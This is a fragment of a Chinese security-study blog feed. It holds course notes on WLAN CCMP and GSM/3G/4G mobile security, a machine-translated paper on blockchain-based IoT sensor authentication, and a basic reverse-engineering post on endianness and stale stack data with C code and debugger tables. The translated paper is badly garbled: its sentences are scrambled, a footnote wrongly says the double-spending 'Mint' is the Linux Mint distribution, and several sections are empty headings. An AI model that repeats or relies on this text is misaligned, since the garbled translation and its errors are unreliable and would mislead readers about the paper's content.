alt="3"></p><h4 id="5、加密机制CCMP—基于AES"><a href="#5、加密机制CCMP—基于AES" class="headerlink" title="5、加密机制CCMP—基于AES"></a>5、加密机制CCMP—基于AES</h4><p><font color="#ff000" face="黑体" size="4">CCMP☆☆☆</font></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C18.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C19.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C20.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C21.png" alt="3"></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C22.png" alt="3"></p><p>+++</p><h3 id="3、移动通信安全机制—-GSM、3G、4G"><a href="#3、移动通信安全机制—-GSM、3G、4G" class="headerlink" title="3、移动通信安全机制—-GSM、3G、4G"></a>3、移动通信安全机制—-GSM、3G、4G</h3><h4 id="1、GSM"><a href="#1、GSM" class="headerlink" title="1、GSM"></a>1、GSM</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C23.png" alt="3"></p><p>+++</p><p>GSM系统的安全目标：</p><ul><li>用户身份认证：保证网络不被未授权者使用</li><li>数据机密性：</li><li>用户身份（IMSI）保密：<ul><li>IMSI（国际移动用户标识）不被泄露给未授权的个人、实体或过程</li></ul></li></ul><p>+++</p><p><strong>GSM安全分析</strong>：</p><ul><li>认证：挑战—-响应，长期密钥没有泄露</li><li>加密：空中接口（即用户到基站部分）</li><li>匿名：TMSI</li></ul><p><strong>GSM的不足</strong>：</p><ul><li>认证：单向认证，且三元组可无限期使用</li><li>加密：没有实现端到端的加密</li><li>完整性：无</li></ul><p>+++</p><h4 id="2、3G☆☆☆认证和密钥协商过程"><a href="#2、3G☆☆☆认证和密钥协商过程" class="headerlink" title="2、3G☆☆☆认证和密钥协商过程"></a>2、3G<font color="#ff000" face="黑体" size="4">☆☆☆认证和密钥协商过程</font></h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C53.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C24.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C25.png" alt="3"></p><p>+++</p><ul><li><p>3G的安全目标：</p><ul><li><p>对用户模块（UE）进行<strong>认证</strong>，特别是用户服务标识模块（USIM）</p></li><li><p>向UE和服务网络SN提供<strong>会话密钥</strong></p></li><li><p>在会话密钥的保护下在UE和SN之间<strong>建立安全连接</strong></p></li></ul></li></ul><ul><li><p><strong>3G的层次</strong>：</p><ol><li>应用层</li><li>归属/服务层</li><li>传输层</li></ol></li></ul><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C26.png" alt="3"></p><p>+++</p><ul><li>3G安全功能结构</li></ul><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C27.png" alt="3"></p><ul><li>增强用户身份保密EUIC（ Enhanced User Identity Confidentiality）：通过归属网对移动用户智能卡身份信息进行认证</li><li>用户身份保密UIC（ User Identity Confidentiality）</li><li>认证和密钥协商AKA（ Authentication&amp; Key agreement）：用于USIM卡、VLR、HLR间进行双向认证和密钥分发</li><li>用户及信令数据保密DC：加密UE与RNC间信息</li><li>消息认证DI：认证消息的完整性、时效以及消息的来源地与目的地</li></ul><p>+++</p><h4 id="3、4G"><a href="#3、4G" class="headerlink" title="3、4G"></a>3、4G</h4><ul><li><p><strong>4G系统的组成：</strong></p><ul><li><p>移动终端</p></li><li><p>无线接入网</p></li><li><p>无线核心网</p></li><li><p>IP骨干网</p></li></ul></li></ul><ul><li>4G的安全威胁<ul><li>现有的无线网络和Internet的安全威胁依然存在<ul><li>4G的终端与各种应用的交互更为复杂，威胁也越多</li></ul></li></ul></li></ul><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C28.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;+++&lt;/p&gt;
&lt;p&gt;1、Web安全&lt;/p&gt;
&lt;p&gt;2、逆向安全&lt;/p&gt;
&lt;p&gt;3、移动通信安全&lt;/p&gt;
&lt;h4 id=&quot;题型：&quot;&gt;&lt;a href=&quot;#题型：&quot; class=&quot;headerlink&quot; title=&quot;题型：&quot;&gt;&lt;/a&gt;&lt;strong&gt;
      
    
    </summary>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>P2P networking based internet of things (IoT) sensor node authentication by Blockchain</title>
    <link href="https://singlemindedt.github.io/2020/05/29/P2P%20networking%20based%20internet%20of%20things%20(IoT)%20sensor%20node%20authentication%20by%20Blockchain(%E5%9F%BA%E4%BA%8EP2P%E7%BD%91%E7%BB%9C%E7%9A%84%E7%89%A9%E8%81%94%E7%BD%91%EF%BC%88IoT%EF%BC%89%E4%BC%A0%E6%84%9F%E5%99%A8%E8%8A%82%E7%82%B9%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AE%A4%E8%AF%81)/"/>
    <id>https://singlemindedt.github.io/2020/05/29/P2P networking based internet of things (IoT) sensor node authentication by Blockchain(基于P2P网络的物联网（IoT）传感器节点区块链认证)/</id>
    <published>2020-05-29T10:20:08.000Z</published>
    <updated>2020-06-12T09:52:14.231Z</updated>
    
    <content type="html"><![CDATA[<h2 id="P2P-networking-based-internet-of-things-IoT-sensor-node-authentication-by-Blockchain-基于P2P网络的物联网（IoT）传感器节点区块链认证"><a href="#P2P-networking-based-internet-of-things-IoT-sensor-node-authentication-by-Blockchain-基于P2P网络的物联网（IoT）传感器节点区块链认证" class="headerlink" title="P2P networking based internet of things (IoT) sensor node authentication by Blockchain(基于P2P网络的物联网（IoT）传感器节点区块链认证)"></a>P2P networking based internet of things (IoT) sensor node authentication by Blockchain(基于P2P网络的物联网（IoT）传感器节点区块链认证)</h2><h3 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h3><p>传感器节点在物联网环境中起着重要作用，每个传感器都是对等网络。由于物理尺寸有限，物联网 传感器节点必须具有轻量认证协议。物联网（IoT）是各种技术的集合 元素。期望异构终端，网络和应用程序之间的互通。他们会加速 通过物联网平台的开放。结果，物联网将出现许多技术和管理安全威胁 环境。传感器节点协议必须轻巧且安全。由于物联网设备有多种用途，因此 需要性能的设备，具有可正常工作的高性能芯片组的操作系统，大多数密码协议。但是，转 点亮/熄灭IoT设备执行简单的任务，例如基于不运行OS的低性能芯片组。如果有 不支持加密协议或证书，则容易受到攻击，并且性能不足以处理。因此， 本文提出了一种基于区块链的物联网设备，以获取更安全的身份验证方案。</p><p><strong>Keywords</strong>： P2P networking . Sensor network . Secure IoT . Node authentication . Light-weight protocol . Network security</p><h3 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h3><p>物联网（IoT）服务容易受到各种攻击 物联网技术的本质带来的安全威胁。特别是，它具有有限的硬件规格，例如低功耗 消耗，少量内存，低内存等， 并且往往分布在难以管理的环境中，这可能会带来各种安全威胁 包括物理攻击的因素。这些特征可以 导致物联网服务安全运行中的致命错误 平台或基于错误信息提供服务， 导致物联网服务平台失去其功能[1]。 </p><p>近年来，预计互操作性 异构终端，网络和应用程序之间 将通过物联网平台的开放而加速， 导致各种技术和行政安全 威胁。物联网环境中可能发生的安全威胁 继承现有威胁中可能发生的威胁 ICT（信息和通信技术）环境。机密性，完整性和可用性（CIA）可以 通常被视为对合法商品的使用和交付的威胁 服务，通常被称为CIA，这三个主要 信息安全的组成部分[2]。表1显示了 物联网每个组件中可能发生的安全威胁[3]。 因此，物联网设备需要一种访问控制方法来保护设备免受单个用户的平台内身份验证以及未经授权的用户对设备的任意访问。 各种环境和各种物联网的服务平台 服务平台和平台应用程序服务[4-6]。</p><p>当前物联网环境中可能发生的安全问题 [3]。 已经开发出各种认证协议，直到 最近。 但是，大多数提议的身份验证协议都用于跟踪位置跟踪攻击的位置。 一个 重播攻击或欺骗攻击易受欺骗攻击 [3]。 许多网站都有弱点和侵犯隐私的行为。 研究人员 正在发现它[5]。 因此，这项研究工作提出了 基于区块链的对等身份验证方案 使用加密算法进行链接和保护。 每个块 具有哈希指针，通常作为指向前一个的符号链接 块，时间戳和交易数据[11]。 根据设计， 区块链固有地抗拒更改数据。</p><p>从技术上讲，区块链可以充当“一个开放的，分布式的分类帐，可以高效，可验证且永久地记录双方之间的交易”。 [12]用作 分散的分类帐，传统上，区块链由 对等网络节点共同遵守协议 用于验证新块。记录后，任何给定的数据 如果没有全部更改，则无法追溯更改块 随后的块和网络多数的冲突[13]。 区块链比非区块链算法更安全[26]。 但是，需要在性能和安全性之间进行权衡。 如果安全交易比效率更重要，那么 区块链是物联网通信的最佳解决方案。 其余研究组织如下。第二节 讨论无线方面一些当前存在的协议 传感器网络（WSN）第3和4节介绍了详细信息 提出的算法。第5节描述了结论 和未来的工作。</p><h3 id="2-Related-work"><a href="#2-Related-work" class="headerlink" title="2 Related work"></a>2 Related work</h3><h4 id="2-1-Wireless-sensor-networks"><a href="#2-1-Wireless-sensor-networks" class="headerlink" title="2.1 Wireless sensor networks"></a>2.1 Wireless sensor networks</h4><p>WSN可以广泛应用于实时等领域 交通监控，军事数据收集，地震活动 分散度测量和时间污染测量。 由于WSN由超小型传感器组成，因此存在一些限制，例如存储内存，计算量和能量 通讯半径。 提供安全的无线通信是一个非常重要的问题，因为传感器可能会暴露在恶劣的环境中，容易拦截无线 通讯，恶意攻击者可以篡改 消息或尝试重传攻击[10]。</p><p>安全的WSN通信的各个方面 研究。 WSN非常容易受到传感器节点（SN）的硬件设备以及节点检测，损坏，窃听， 拒绝服务攻击和路由攻击（例如，漏洞和蠕虫漏洞）取决于无线网络的特征[1]。</p><p>由于传感器节点的性质有限，因此不容易 应用现有的WSN安全技术。 因此， 正在研究加权密钥分发和认证方案，以实现消息等安全因素 完整性，机密性和节点身份验证。</p><p>应用轻量级公钥有两种方法 具有大量现有计算以适合 传感器节点和μ-TESLA（定时的“微型”版本， 高效，流式，容错认证协议） 和LEAP（轻量级可扩展身份验证协议） 低计算能力和安全密钥分发的SPINS（安全网络加密协议）[24]设计 [22]。 </p><p>PIKE（密钥建立同行机构）[25]具有 提出了一种确保网络安全的密钥分配方案 基于对称密钥的安全性基于对称密钥的公开。 另外，不需要密钥的基于ID的方案 分布以及在消息传输频率上具有优势的问题也在研究中。</p><p>由于无线通信的本质，WSN的缺点是容易窃听消息[7]。 因此，为了防止这种情况，有必要通过加密和交换数据来确保机密性。</p><p>为了生成认证密钥，所有SN进行通信 直接与基站（BS）。 其实很难 与SN和BS直接通信。 </p><p>如果能量有限的节点尝试通信 直接与远程BS进行通信，则能耗为 通过发送和接收身份验证消息而增加。 消耗这种能量的节点不能 长期参与交流[10]。</p><h3 id="2-2-Light-weight-sensor-networks-protocols"><a href="#2-2-Light-weight-sensor-networks-protocols" class="headerlink" title="2.2 Light-weight sensor networks protocols"></a>2.2 Light-weight sensor networks protocols</h3><p>有一些基于轻量级公钥的协议，并且 它们是由μ-TESLA[21]，LEAP [22]和SPINS [23]设计的 具有较低的计算能力和安全的密钥分发。 传感器节点在物联网环境中起着重要作用。 传感器 节点是物联网的关键。 因此，许多研究人员正在专注于 传感器节点的攻击承受能力和有效的通信 协议。</p><p>物联网存在一些问题，详细信息如下。</p><p> 互联网基于ICT（互联网通信） 技术），这是一种智能环境，可在用户与对象之间以及对象与对象之间传递信息 通过连接工作。</p><p>美国市场研究公司Gartner 选择物联网作为最受关注的技术领域[8]。 物联网是 分为三大类：设备（终端/传感器） 区域，网络（有线/无线）区域和服务接口 （平台/应用程序）区域。 设备区域传输数据 从特定对象收集并提取到另一个对象 使用嵌入在对象中的通信功能。 网络区域是一个有线/无线通道，用于 传输/接收用户与 对象，对象到对象。 服务接口区域处理数据以生成信息，并控制和管理 各种设备。</p><h3 id="2-3-Vulnerability-on-IoT"><a href="#2-3-Vulnerability-on-IoT" class="headerlink" title="2.3 Vulnerability on IoT"></a>2.3 Vulnerability on IoT</h3><p>虚假攻击是指攻击者伪装成 传感器网络中的合法服务器以及客户端 发出身份验证请求，继续执行协议， 非法获取传感器或传感器的认证密钥 用户。重传攻击是指在认证过程中，实体之间的认证过程中使用的组件 传感器网络将在后续的身份验证过程中存储和重用[9]。</p><p> 身份验证密钥猜测攻击是对 攻击者窃听或伪装传感器网络中用户到传感器与传感器到传感器之间的身份验证过程，存储发送和接收的元素，并找到与最终商定的密钥相同的密钥 认证密钥[22]。 </p><p>拒绝服务攻击是指攻击者进行的攻击 参与身份验证过程并拦截 即使传感器或用户请求身份验证也可以做出响应， 从而拒绝身份验证服务。 </p><p>隐私侵害是一种侵犯隐私的行为，它通过从发送的元素中暴露出参与通信的主体 并在传感器上的身份验证过程中收到 网络。</p><h3 id="2-4Attack-model（攻击模型-）"><a href="#2-4Attack-model（攻击模型-）" class="headerlink" title="2.4Attack model（攻击模型 ）"></a>2.4Attack model（攻击模型 ）</h3><p>本研究中的攻击模型可以是DoS攻击。 在DoS中 攻击，攻击者正试图逃避或冒充 通过发送伪装的假消息来合法的IoT设备 作为合法的物联网设备。 类似的情况可能在 点对点网络也是如此。 例如，合法的物联网 连接到其他物联网设备的节点设备，其中一些 可能是合法的，而其他人可能是恶意的。 这可能 最终导致网络拥塞并拒绝某些物联网 设备访问一些数据流。 问题是 将影响物联网设备的认证过程。 因此，与集中式系统相比，攻击者 正在处理所有都具有的物联网设备 区块链的当前状态。 因此，可以得出结论 DoS攻击很难通过对等网络进行，以损害整个网络的安全性 物联网数量众多导致网络和区块链 设备。</p><h3 id="3-Blockchain-based-sensor-node-authentication"><a href="#3-Blockchain-based-sensor-node-authentication" class="headerlink" title="3 Blockchain-based sensor node authentication"></a>3 Blockchain-based sensor node authentication</h3><p>作者应该有足够的背景信息来 提供本文中所建议方法的更多接受</p><h4 id="3-1-Blockchain"><a href="#3-1-Blockchain" class="headerlink" title="3.1 Blockchain"></a>3.1 Blockchain</h4><p>因为任何参与使用区块链的人 可以输入，更改或删除数据，TTP（信任第三方） 不需要存在就可以在不诚实的网络各方之间进行交易。为了验证这种交易，使用共识算法，可以保证存储在其中的数据的可靠性 经过授权用户之间特定机制操作后的区块链。从而安全地更新和维护 区块链的状态，确保 区块链图1将电子硬币定义为 数字签名。每个成员将硬币转发到下一个 通过数字签名先前交易的哈希值和 下一个成员的公共密钥，将它们添加到 硬币。收款人可以验证签名以验证 成员资格[14]。区块链如图1所示。 当前块的值，数字签名，哈希值 对等网络。应用（2020）13：579–589 581 当前块，块标题和Merkle根以及块 数据由交易组成。</p><p>问题是收件人无法验证其中之一 业主不是双花硬币。常见的解决方案是 介绍一个可靠的中央机构，薄荷，交易 双重支出。每次交易后必须返回 硬币造币厂。 </p><p>我们相信不会发行新硬币，只会发行硬币 由Mint1直接发行的将被重复使用。与问题 这个解决方案是整个瞬时系统的命运。 公司需要经营造币厂，并将其全部通过 交易通过银行进行。收件人以前没有签署过先前的会员交易。制作的唯一方法 确保没有涉及所有交易的交易。基于薄荷 模型，薄荷知道所有交易。我决定到达 第一。为了在没有可信任方的情况下实现这一目标，公开宣布了他们收到的订单。在每次交易时，大多数节点都同意这是第一次[14]。</p><p> 构成区块链的区块由区块组成 标头和块体。块头包含哈希 前一个块标题的值，所有块都是 通过链表之类的链表方法连接起来，并且 包括用于共识的任意随机数 调整块生成难度的算法和位。块体可以具有不同的值，具体取决于 他们支持的服务。例如，在比特币中，数字 密码系统，用户之间发生的交易 块体中包含10分钟。区块链可能 成为公共区块链，私有区块链，财团 区块链可以分为三类[15]。每个块体 磷在结构上完全相似。但是，他们 具有不同的概念和功能，并且在每个区块链上定义和实现也有先决条件。 公共区块链是用于普遍使用的区块链 被称为比特币，以及私有区块链或财团 区块链是将区块链用于其他方面的概念 目的。</p><h4 id="3-2-Conventional-IoT-sensor-nodes-authentication-types"><a href="#3-2-Conventional-IoT-sensor-nodes-authentication-types" class="headerlink" title="3.2 Conventional IoT sensor nodes authentication types"></a>3.2 Conventional IoT sensor nodes authentication types</h4><p>在物联网环境中，攻击者伪装成物联网 具有各种攻击（例如攻击，重用攻击， 和DoS攻击被允许访问内部 物联网环境。 </p><p>在现有的物联网环境中，有五种不同的 身份验证协议的类型。 表1显示了优点 每种认证技术的利弊[15]。</p><h4 id="3-2-1-ID-based-authentication"><a href="#3-2-1-ID-based-authentication" class="headerlink" title="3.2.1 ID-based authentication"></a>3.2.1 ID-based authentication</h4><p>基于ID的身份验证通过使用用户的电子邮件地址，名称，IP地址提供数字签名和身份验证 作为公钥密码系统。 预分配的密钥不是 需要。 计算量小，密钥长度为 比较短。 但是，它容易受到ID欺骗攻击的攻击。 有赫斯算法，林恩算法，绅士 图1交易中的区块链 1 Mint是基于Debian和Ubuntu的Linux发行版，很容易 采用。 582对等网络 应用 （2020）13：579–589 和Silverberg的算法，以及各种身份验证 方案[15]。</p><h4 id="3-2-2-Certificate-based-authentication"><a href="#3-2-2-Certificate-based-authentication" class="headerlink" title="3.2.2 Certificate-based authentication"></a>3.2.2 Certificate-based authentication</h4><p>一种使用数字签名进行认证的方法 公钥密码系统，将用于电子签名的信息记录在证书中，并根据该信息执行身份验证。 在韩国，有关 已通过《数字签名法》准备了发行系统和授权证书的管理 成立于1999年，并颁发了证书 由根CA进行最高级别的认证 机构通过五个授权的认证机构。 在外面 在整个国家，Verisign的设备认证服务包括 个人设备，电缆调制解调器设备认证，以及 WiMAX行业认证。 另外，基于证书 身份验证技术正在VoIP，网络监控摄像头等中使用，并且该领域正在逐步扩大。</p><p>基于证书的身份验证技术提供了很高的 通过强大的身份验证功能实现安全性并提供不可否认性。 但是，设备证书处理 软件和算法需要很高的计算吞吐量。 因此，它不适合用于低功耗，低性能的物联网设备。</p><h4 id="3-2-3-Cryptography-protocol-based"><a href="#3-2-3-Cryptography-protocol-based" class="headerlink" title="3.2.3 Cryptography protocol based"></a>3.2.3 Cryptography protocol based</h4><h4 id="3-2-4-MAC-address-based-authentication"><a href="#3-2-4-MAC-address-based-authentication" class="headerlink" title="3.2.4 MAC address based authentication"></a>3.2.4 MAC address based authentication</h4><h4 id="3-2-5-ID-password-based-authentication"><a href="#3-2-5-ID-password-based-authentication" class="headerlink" title="3.2.5 ID/password-based authentication"></a>3.2.5 ID/password-based authentication</h4><h3 id="4-Proposed-P2P-networking-based-IoT-sensor-authentication-by-Blockchain"><a href="#4-Proposed-P2P-networking-based-IoT-sensor-authentication-by-Blockchain" class="headerlink" title="4 Proposed P2P networking based IoT sensor authentication by Blockchain"></a>4 Proposed P2P networking based IoT sensor authentication by Blockchain</h3><h4 id="4-1-Requirements"><a href="#4-1-Requirements" class="headerlink" title="4.1 Requirements"></a>4.1 Requirements</h4><h4 id="4-2-Device-authentication-method"><a href="#4-2-Device-authentication-method" class="headerlink" title="4.2 Device authentication method"></a>4.2 Device authentication method</h4><h4 id="4-3-Hacking-scenario-on-IoT-authentication"><a href="#4-3-Hacking-scenario-on-IoT-authentication" class="headerlink" title="4.3 Hacking scenario on IoT authentication"></a>4.3 Hacking scenario on IoT authentication</h4><h5 id="4-3-1-Jamming-attack-assumption"><a href="#4-3-1-Jamming-attack-assumption" class="headerlink" title="4.3.1 Jamming attack assumption"></a>4.3.1 Jamming attack assumption</h5><h4 id="4-4-Proposed-IoT-authentication-by-Blockchain"><a href="#4-4-Proposed-IoT-authentication-by-Blockchain" class="headerlink" title="4.4 Proposed IoT authentication by Blockchain"></a>4.4 Proposed IoT authentication by Blockchain</h4><h4 id="4-5-Proposed-IoT-multiple-level-node-authentication-model"><a href="#4-5-Proposed-IoT-multiple-level-node-authentication-model" class="headerlink" title="4.5 Proposed IoT multiple-level node authentication model"></a>4.5 Proposed IoT multiple-level node authentication model</h4><h3 id="5-Conclusions"><a href="#5-Conclusions" class="headerlink" title="5 Conclusions"></a>5 Conclusions</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;P2P-networking-based-internet-of-things-IoT-sensor-node-authentication-by-Blockchain-基于P2P网络的物联网（IoT）传感器节点区块链认证&quot;&gt;&lt;a href=&quot;#P2P-netwo
      
    
    </summary>
    
    
      <category term="translation" scheme="https://singlemindedt.github.io/tags/translation/"/>
    
  </entry>
  
  <entry>
    <title>简单逆向</title>
    <link href="https://singlemindedt.github.io/2020/05/11/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91/"/>
    <id>https://singlemindedt.github.io/2020/05/11/简单逆向/</id>
    <published>2020-05-11T08:32:31.000Z</published>
    <updated>2020-05-14T17:03:28.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="程序一、字节序"><a href="#程序一、字节序" class="headerlink" title="程序一、字节序"></a>程序一、字节序</h2><h3 id="程序源码"><a href="#程序源码" class="headerlink" title="程序源码"></a>程序源码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"windows.h"</span></span></span><br><span class="line">BYTE b=<span class="number">0x12</span>; </span><br><span class="line">WORD w=<span class="number">0x1234</span>;</span><br><span class="line">DWORD dw=<span class="number">0x123456</span>; </span><br><span class="line"><span class="keyword">char</span> str[]=<span class="string">"abcde"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">byte lb=b;</span><br><span class="line"> WORD lw=w;</span><br><span class="line"> DWORD ldw=dw;</span><br><span class="line"> <span class="keyword">char</span> *lstr=str;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p><strong>小端序（ Littie endian）</strong>：低地址存放低字节，高地址存放高字节，符合人类思维（地址0x100处，存储整数0x01234567）</p><table><thead><tr><th>地址</th><th>…</th><th>0x100</th><th>0x101</th><th>0x102</th><th>0x103</th><th>…</th></tr></thead><tbody><tr><td>值</td><td>…</td><td>0x67</td><td>0x45</td><td>0x23</td><td>0x01</td><td>…</td></tr></tbody></table><p><strong>大端序（Big endian）</strong>:低地址存放高字节，高地址存放低字节</p><table><thead><tr><th>地址</th><th>…</th><th>0x100</th><th>0x101</th><th>0x102</th><th>0x103</th><th>…</th></tr></thead><tbody><tr><td>值</td><td>…</td><td>0x01</td><td>0x23</td><td>0x45</td><td>0x67</td><td>…</td></tr></tbody></table><p>+++</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><table><thead><tr><th>TYPE</th><th>Name</th><th>SIZE</th><th>大端序类型</th><th>小端序类型</th></tr></thead><tbody><tr><td>BYTE</td><td>b</td><td>1</td><td><a href="()">12</a></td><td><a href="()">12</a></td></tr><tr><td>WORD</td><td>w</td><td>2</td><td><a href="()">12</a> <a href="()">34</a></td><td><a href="()">34</a> <a href="()">12</a></td></tr><tr><td>DWORD</td><td>dw</td><td>4</td><td><a href="()">12</a> <a href="()">34</a> [56] [78]</td><td>[78] [56] <a href="()">34</a> <a href="()">12</a></td></tr><tr><td>char[]</td><td>str</td><td>6</td><td>[61] [62] [63] [64] [65] [00]</td><td>[61] [62] [63] [64] [65] [00]</td></tr></tbody></table><blockquote><ul><li><p>对于char[]字符数组，在内存中连续，不管大端序还是小端序，存储顺序都是一样的</p></li><li><p>x86系列CPU是小端序；</p></li><li><p>PowerPC是大端序;</p></li><li><p>网络协议也采用大端序（大端序也称网络字节序)</p></li></ul></blockquote><p>+++</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><blockquote><p>环境:x32dbg</p></blockquote><p>main函数汇编代码:</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwPYQ.png" alt="YBwPYQ.png"><br>程序执行至<strong>0x4013EB</strong> <code>leave</code>时的程序栈:</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwpTS.png" alt="YBwpTS.png"><br>相应的函数栈帧:</p><table><thead><tr><th><strong>ESP</strong></th><th>0022FF40</th><th>00401920</th></tr></thead><tbody><tr><td><strong>lstr地址</strong></td><td><strong>0022FF44</strong></td><td><strong>00402008</strong></td></tr><tr><td><strong>ldw</strong></td><td><strong>0022FF48</strong></td><td><strong>00123456</strong></td></tr><tr><td><strong>b和w</strong></td><td><strong>0022FF4C</strong></td><td><strong>12FD1234</strong></td></tr><tr><td></td><td><strong>0022FF50</strong></td><td><strong>0000000A</strong></td></tr><tr><td></td><td><strong>0022FF54</strong></td><td><strong>00000002</strong></td></tr><tr><td><strong>EBP</strong></td><td><strong>0022FF58</strong></td><td><strong>0022FFF0</strong></td></tr><tr><td><strong>返回地址</strong></td><td><strong>0022FF5C</strong></td><td><strong>004010FD</strong></td></tr></tbody></table><p>寄存器状态，<code>EAX=0</code>表示<code>return 0</code>语句</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwiWj.png" alt="YBwiWj.png"><br>+++</p><h2 id="程序二、栈的脏数据"><a href="#程序二、栈的脏数据" class="headerlink" title="程序二、栈的脏数据"></a>程序二、栈的脏数据</h2><h3 id="程序源码-1"><a href="#程序源码-1" class="headerlink" title="程序源码"></a>程序源码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a,b,c;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a=%d,b=%d,c=%d\n"</span>,a,b,c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">f1();</span><br><span class="line">f2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++<br>[3]:()<br><img src="https://s1.ax1x.com/2020/05/14/YBwCFg.png" alt="YBwCFg.png"></p><p>+++</p><h3 id="补充-1"><a href="#补充-1" class="headerlink" title="补充"></a>补充</h3><p>函数栈退出以后，原有栈空间里的局部变量<strong>不会</strong>被自动清除，成为栈的<strong>噪音</strong>或<strong>脏数据</strong>。<br>+++</p><h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><blockquote><p>环境:x32dbg</p></blockquote><p><strong>f1(),f2()</strong>汇编代码:</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwkSs.png" alt="YBwkSs.png"><br>当程序执行至<strong>0x4013CB</strong> <code>leave</code>（<strong>f1()</strong>函数对应参数均已入栈）时，对应栈布局:</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwSw8.png" 